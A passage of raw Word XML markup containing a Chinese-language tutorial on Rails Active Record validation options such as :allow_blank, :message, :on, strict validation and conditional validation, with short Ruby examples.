                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="0002548C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F06A85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1B7EAEC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02548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:allow_nil</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项在 presence 校验中将被忽略</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660507B3" w14:textId="05F0F992"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4.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:allow_blank</w:t>
      </w:r>
      <w:r w:rsidR="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 允许为空</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A05495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02548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:allow_blank</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项和 </w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:allow_nil</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项很相似</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当被校验的值为 </w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时，譬如 </w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者空字符串，校验将被跳过</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256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="76DFA7B2" w14:textId="77777777" w:rsidTr="0002548C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67DAD32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Topic &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50E4B0B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:title, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :is</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 5</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}, :allow_blank</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705BC22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0B3541E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152E9AB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Topic.create("title"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "").valid?  # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37F2C0E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Topic.create("title"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; nil).valid? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D315DE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02548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:allow_blank</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项在 presence 校验中将被忽略</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69ED86D8" w14:textId="4380E61C"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4.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidR="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定校验错误信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585AF16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如前所见，你可以</w:t>
      </w:r>
      <w:r w:rsidRPr="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定当校验失败时需要添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="00A26EE7">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合中的错误信息</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。如果没有使用该选项，Active Record 将会使用校验 helper 各自默认的错误信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33EBA33B" w14:textId="3FA1EADA"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4.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidR="002E0EBD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定何时进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E1EBB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你可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来</w:t>
      </w:r>
      <w:r w:rsidRPr="002E0EBD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>指定何时进行校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="002E0EBD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>所有内建的校验 helpers 默认在 Active Record 对象 save 的时候运行校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(无论你是</w:t>
      </w:r>
      <w:r w:rsidRPr="002E0EBD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>新建</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>一个AR对象还是</w:t>
      </w:r>
      <w:r w:rsidRPr="002E0EBD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>更新</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">它都会执行校验)。如果你想改变校验时机，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:on =&gt; :create</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定仅在新建一个 Active Record 对象的时候进行校验，或者使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:on =&gt; :update</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定仅在更新一个 Active Record 对象的时候进行校验。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="13FF38B1" w14:textId="77777777" w:rsidTr="00BA5176">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="031CD12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0390A0C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 it will be possible to update email with a duplicated value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E75DE4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:email, :uniqueness</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 :on</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ADDE3D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5D7987C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 it will be possible to create the record with a non-numerical age</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A5B398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:age, :numericality</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 :on</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38BA03F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53382A5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 the default (validates on both create and update)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CBC801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:name,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 :on</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="568A558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412E9752"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5 严格校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33700765" w14:textId="0D7FF18E"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你也可以</w:t>
      </w:r>
      <w:r w:rsidR="00BA5176" w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>指</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>定校验为严格</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，这样</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当 AR 对象校验失败时总会抛出 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>ActiveModel::StrictValidationFailed</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 异常</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7BA5927C" w14:textId="77777777" w:rsidTr="00BA5176">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BD8890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6D0DBB7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:name,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 :strict</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42DEA49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725E252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20C333C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Person.new.valid?  =&gt; ActiveModel::StrictValidationFailed: Name can't be blank</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19F1864D" w14:textId="4FFA37BB"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6 有条件的校验</w:t>
      </w:r>
      <w:r w:rsidR="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> 满足某条件才进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B9F72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有时你可能想在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>只有当满足给定的条件后才对 AR 对象进行校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这时你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来达到这个目的，他们接受一个符号，字符串，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Porc</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
